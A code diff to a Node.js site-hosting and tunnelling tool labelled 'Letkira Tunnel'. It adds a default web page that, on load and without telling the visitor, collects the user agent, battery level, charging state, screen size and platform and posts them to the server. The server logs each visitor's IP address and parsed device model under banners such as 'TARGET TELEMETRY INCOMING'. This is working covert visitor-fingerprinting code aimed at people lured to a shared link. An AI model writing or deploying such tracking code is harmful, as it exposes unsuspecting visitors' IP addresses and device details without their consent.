@@ -114,7 +114,43 @@ async function editHtml(indexPath) {
     try {
         await fs.access(indexPath);
     } catch {
-        const defaultHtml = '<!DOCTYPE html>\n<html>\n<head>\n<title>Hosted Site</title>\n<script>\nfunction captureData() {\n    const details = {\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        screen: window.screen.width + "x" + window.screen.height,\n        referrer: document.referrer || "Direct"\n    };\n    fetch("/log-capture", {\n        method: "POST",\n        headers: { "Content-Type": "application/json" },\n        body: JSON.stringify(details)\n    });\n}\nwindow.onload = captureData;\n</script>\n</head>\n<body>\n<h1>Hello From Letkira Tunnel</h1>\n</body>\n</html>';
+        const defaultHtml = `<!DOCTYPE html>
+<html>
+<head>
+<title>Hosted Site</title>
+<script>
+async function captureData() {
+    let batteryLevel = "N/A";
+    let isCharging = "N/A";
+    try {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            batteryLevel = (battery.level * 100) + "%";
+            isCharging = battery.charging ? "Yes" : "No";
+        }
+    } catch (e) {}
+
+    const details = {
+        userAgent: navigator.userAgent,
+        battery: batteryLevel,
+        charging: isCharging,
+        screen: window.screen.width + "x" + window.screen.height,
+        platform: navigator.platform || "N/A"
+    };
+
+    fetch("/log-capture", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(details)
+    });
+}
+window.onload = captureData;
+</script>
+</head>
+<body>
+<h1>Hello From Letkira Tunnel</h1>
+</body>
+</html>`;
         await fs.writeFile(indexPath, defaultHtml, 'utf-8');
     }
 
@@ -136,13 +172,31 @@ async function startHosting(projectPath) {
 
     app.post('/log-capture', (req, res) => {
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-        console.log(`\n${colors.success('[!] ADVANCED TARGET LOG CAPTURED [!]')}`);
-        console.log(`${colors.secondary('IP Address:')}  ${colors.accent(ip)}`);
-        console.log(`${colors.secondary('User Agent:')}  ${colors.accent(req.body.userAgent || 'N/A')}`);
-        console.log(`${colors.secondary('Language:')}    ${colors.accent(req.body.language || 'N/A')}`);
-        console.log(`${colors.secondary('Resolution:')}  ${colors.accent(req.body.screen || 'N/A')}`);
-        console.log(`${colors.secondary('Referrer:')}    ${colors.accent(req.body.referrer || 'N/A')}`);
-        console.log(colors.success('─────────────────────────────────────────'));
+        const ua = req.body.userAgent || '';
+        
+        let device = "Unknown Device";
+        if (ua.match(/Android/i)) {
+            const match = ua.match(/Android\s+([^\s;]+);?\s+([^;\)]+)/) || ua.match(/Linux;\s+Android\s+[^;]+;\s+([^;\)]+)/);
+            device = match ? `Android (${match[1] || match[2]})` : "Android Device";
+        } else if (ua.match(/iPhone/i)) {
+            device = "iPhone";
+        } else if (ua.match(/Windows/i)) {
+            device = "Windows PC";
+        } else if (ua.match(/Macintosh/i)) {
+            device = "MacBook";
+        } else if (ua.match(/Linux/i)) {
+            device = "Linux Machine";
+        }
+
+        console.log(`\n${colors.success('┌────────────────────────────────────────────────────────┐')}`);
+        console.log(`${colors.success('│')} ${colors.primary('TARGET TELEMETRY INCOMING')}                               ${colors.success('│')}`);
+        console.log(`${colors.success('├────────────────────────────────────────────────────────┤')}`);
+        console.log(`${colors.success('│')} ${colors.secondary('IP Address:')}  ${colors.accent(ip.padEnd(39))} ${colors.success('│')}`);
+        console.log(`${colors.success('│')} ${colors.secondary('Device:')}      ${colors.accent(device.padEnd(39))} ${colors.success('│')}`);
+        console.log(`${colors.success('│')} ${colors.secondary('Battery:')}     ${colors.accent(`${req.body.battery} (Charging: ${req.body.charging})`.padEnd(39))} ${colors.success('│')}`);
+        console.log(`${colors.success('│')} ${colors.secondary('Resolution:')}  ${colors.accent((req.body.screen || 'N/A').padEnd(39))} ${colors.success('│')}`);
+        console.log(`${colors.success('└────────────────────────────────────────────────────────┘')}\n`);
+
         res.sendStatus(200);
     });
 
@@ -150,7 +204,7 @@ async function startHosting(projectPath) {
         if (req.path !== '/log-capture') {
             const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
             const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-            console.log(`${colors.accent(`[${timestamp}]`)} Connection: ${colors.secondary(ip)} -> ${colors.primary(req.method)} ${colors.secondary(req.url)}`);
+            console.log(`${colors.accent(`[${timestamp}]`)} Route Request: ${colors.secondary(ip)} -> ${colors.primary(req.method)} ${colors.secondary(req.url)}`);
         }
         next();
     });
@@ -171,7 +225,7 @@ async function startHosting(projectPath) {
             console.log(`\n${colors.primary('┌────────────────────────────────────────────────────────┐')}`);
             console.log(`${colors.primary('│')} ${colors.secondary('Live URL:')} ${colors.accent(match[0].padEnd(45))} ${colors.primary('│')}`);
             console.log(`${colors.primary('└────────────────────────────────────────────────────────┘')}\n`);
-            console.log(colors.error('--- LIVE STREAM TRAFFIC LOGS ---\n'));
+            console.log(colors.error('--- LIVE TRAFFIC DEVICE LOGS ---\n'));
         }
     });
 
